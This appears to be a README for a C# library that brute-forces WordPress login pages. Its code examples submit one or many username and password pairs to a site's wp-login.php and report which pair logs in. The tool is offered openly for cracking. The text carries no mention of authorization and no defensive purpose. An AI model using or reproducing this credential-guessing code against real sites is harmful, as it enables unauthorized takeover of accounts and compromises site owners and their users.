
# WordPress Cracker (Bruteforce) with C#

Cracking WordPress login page with a simple bruteforce. 

Note: this project is a C# standard library, not a console app. If you want an implementation, consider creating one and add a reference to this library.


## Documentation

### Bruteforcing
Below is a simple example on how to simulate a login to a WordPress site with the specified username, password, and login page url. It'll return true if the given `FormData` object is valid, otherwise false.

```csharp
using Opapps.Lib.WordpressCracker.Entities;
using Opapps.Lib.WordpressCracker.Services;

...

var loginUrl = "https://some-url.com/wp-login.php";
var loginCredential = new FormData("user", "some correct password");
var wpLoginCracker = new WordpressLoginCracker();
bool res = await wpLoginCracker.AttemptLoginAsync(loginUrl, loginCredential); // return true


```

You can also bruteforce with many `FormData` objects at once:


```csharp
using Opapps.Lib.WordpressCracker.Entities;
using Opapps.Lib.WordpressCracker.Services;

...

var loginUrl = "https://some-url.com/wp-login.php";
var loginCredentials = new List<FormData>();
loginCredentials.Add(new FormData("user", "some wrong password"));
loginCredentials.Add(new FormData("user", "some correct password"));

var wpLoginCracker = new WordpressLoginCracker();
FormData res = await wpLoginCracker.AttemptLoginRangeAsync(loginUrl, loginCredentials); // return the second `FormData` object.

```
